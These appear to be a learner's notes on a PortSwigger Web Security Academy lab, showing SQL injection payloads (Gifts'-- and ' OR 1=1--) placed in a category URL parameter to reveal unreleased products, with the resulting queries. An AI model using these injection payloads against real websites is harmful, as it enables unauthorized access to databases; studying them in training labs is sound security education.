Sql-injection, Retreving hidden data

# example
https://insecure-website.com/products?category=Gifts'--
This results in the SQL query:
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

similiar attack:
https://insecure-website.com/products?category=Gifts'+OR+1=1--
This results in the SQL query:
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

# task 1
Display one or more unreleased products from url: https://0ae200b804d220698181024f0041001e.web-security-academy.net/

- Click page gifts or another pages. Then the url will change to: https://0ae200b804d220698181024f0041001e.web-security-academy.net/filter?category=Gifts
- Check that link can inject use =' in `category=Gifts  `
  If `=Gifts%27--` happen then inject the web succesfully
  `https://0a6700e50488aea483815a09007500e6.web-security-academy.net/filter?category=%27`
  which means: SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
  (But problem not solved yet)

- Use Another attack with: SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
- `https://0a6700e50488aea483815a09007500e6.web-security-academy.net/filter?category=%27+or+1=1--`

Problem Solved
